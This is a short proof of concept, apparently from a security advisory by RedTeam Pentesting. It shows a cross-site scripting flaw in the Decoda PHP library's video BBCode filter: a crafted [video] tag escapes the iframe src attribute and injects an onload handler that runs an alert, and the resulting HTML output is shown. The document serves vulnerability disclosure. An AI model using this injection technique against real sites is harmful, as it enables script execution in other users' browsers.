@@ -1,0 +1,18 @@
+<?php
+include '../decoda/Decoda.php';
+$code = new Decoda();
+$code->addFilter(new VideoFilter()); ?>
+<?php
+
+$decoda_markup = '[video="youtube" size="small"]"';
+$decoda_markup .= 'onload="alert(\'RedTeam Pentesting XSS\');" id="[/video]';
+
+$code->reset($decoda_markup);
+echo $code->parse();
+?>
+
+This results in the following output (whitespace adjusted):
+
+<iframe src="http://www.youtube.com/embed/"; onload="alert('RedTeam
+Pentesting XSS');" id="" width="560" height="315"
+frameborder="0"></iframe>
